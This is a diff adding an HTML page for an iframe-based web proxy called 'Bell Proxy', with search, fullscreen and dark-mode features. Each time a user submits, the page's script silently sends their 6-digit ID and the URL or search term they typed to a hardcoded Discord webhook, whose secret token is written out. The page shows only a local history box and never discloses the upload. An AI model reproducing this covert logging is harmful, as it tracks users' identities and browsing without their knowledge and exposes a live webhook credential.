@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bell Proxy</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #ffffff;
+            color: #000000;
+            transition: background-color 0.3s, color 0.3s;
+        }
+        #log {
+            margin-top: 20px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            background-color: #f9f9f9;
+            color: #000000;
+            height: 100px;
+            overflow-y: auto;
+            transition: background-color 0.3s, color 0.3s;
+        }
+        .input-container {
+            margin-bottom: 10px;
+        }
+        .input-container label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input[type="text"], button {
+            padding: 5px;
+            font-size: 16px;
+            transition: background-color 0.3s, color 0.3s, border-color 0.3s;
+        }
+        button {
+            cursor: pointer;
+        }
+        iframe {
+            width: 100%;
+            height: 400px;
+            border: 1px solid #ccc;
+            margin-top: 20px;
+        }
+        #fullscreenButton {
+            margin-top: 10px;
+            display: none;
+        }
+        body.dark-mode {
+            background-color: #121212;
+            color: #ffffff;
+        }
+        body.dark-mode #log {
+            background-color: #1e1e1e;
+            color: #ffffff;
+            border-color: #444;
+        }
+        body.dark-mode input[type="text"], body.dark-mode button {
+            background-color: #333;
+            color: #ffffff;
+            border-color: #555;
+        }
+        body.dark-mode button:hover {
+            background-color: #444;
+        }
+        .dark-mode-switch {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+        }
+        .dark-mode-switch label {
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="dark-mode-switch">
+        <label for="darkModeToggle">🌙 Dark Mode</label>
+        <input type="checkbox" id="darkModeToggle">
+    </div>
+    <h1>Bell Proxy</h1>
+    <div class="input-container">
+        <label for="userId">What's your 6-digit ID?</label>
+        <input type="text" id="userId" placeholder="Enter 6-digit ID" maxlength="6">
+    </div>
+    <div class="input-container">
+        <label for="userInput">Enter a URL or search Google:</label>
+        <input type="text" id="userInput" placeholder="Enter URL or search term">
+    </div>
+    <button id="submitButton">Submit</button>
+    <p> Website History </p>
+    <div id="log"></div>
+    <iframe id="contentFrame" style="display: none;"></iframe>
+    <button id="fullscreenButton">Open in Fullscreen</button>
+    <script>
+        const userIdInput = document.getElementById('userId');
+        const userInput = document.getElementById('userInput');
+        const submitButton = document.getElementById('submitButton');
+        const logArea = document.getElementById('log');
+        const contentFrame = document.getElementById('contentFrame');
+        const fullscreenButton = document.getElementById('fullscreenButton');
+        const webhookUrl = 'https://discord.com/api/webhooks/1350289177022955550/9C7mMg7MqdkReE-f3xg9AqSsqjb_0ZyrQZ66z7KZk3LitgzDCYJ7kZQt2dtTMpuy1NDQ';
+        const darkModeToggle = document.getElementById('darkModeToggle');
+        darkModeToggle.addEventListener('change', () => {
+            document.body.classList.toggle('dark-mode', darkModeToggle.checked);
+            localStorage.setItem('darkMode', darkModeToggle.checked ? 'enabled' : 'disabled');
+        });
+        if (localStorage.getItem('darkMode') === 'enabled') {
+            darkModeToggle.checked = true;
+            document.body.classList.add('dark-mode');
+        }
+        function isValidUrl(string) {
+            try {
+                new URL(string);
+                return true;
+            } catch (_) {
+                return false;
+            }
+        }
+        function toggleFullscreen() {
+            if (document.fullscreenElement) {
+                document.exitFullscreen();
+            } else {
+                contentFrame.requestFullscreen().catch(err => {
+                    console.error('Error attempting to enable fullscreen mode:', err);
+                });
+            }
+        }
+        fullscreenButton.addEventListener('click', toggleFullscreen);
+        document.addEventListener('fullscreenchange', () => {
+            if (document.fullscreenElement) {
+                fullscreenButton.textContent = 'Exit Fullscreen';
+            } else {
+                fullscreenButton.textContent = 'Open in Fullscreen';
+            }
+        });
+        submitButton.addEventListener('click', async () => {
+            const userId = userIdInput.value.trim();
+            const userQuery = userInput.value.trim();
+            if (!/^\d{6}$/.test(userId)) {
+                alert('Please enter a valid 6-digit ID.');
+                return;
+            }
+            if (!userQuery) {
+                alert('Please enter a URL or search term.');
+                return;
+            }
+            const logMessage = `User ID: ${userId}\nInput: ${userQuery}`;
+            logMessageToScreen(logMessage);
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: logMessage,
+                    }),
+                });
+                if (!response.ok) {
+                    console.error('Failed to send log to Discord');
+                }
+            } catch (error) {
+                console.error('Error sending log to Discord:', error);
+            }
+            if (isValidUrl(userQuery)) {
+                contentFrame.src = userQuery;
+            } else {
+                const googleSearchUrl = `https://www.google.com/webhp?igu=1&q=${encodeURIComponent(userQuery)}`;
+                contentFrame.src = googleSearchUrl;
+            }
+            contentFrame.style.display = 'block';
+            fullscreenButton.style.display = 'block';
+            userInput.value = '';
+        });
+        function logMessageToScreen(message) {
+            const logEntry = document.createElement('div');
+            logEntry.textContent = message;
+            logArea.appendChild(logEntry);
+            logArea.scrollTop = logArea.scrollHeight;
+        }
+    </script>
+</body>
+</html>
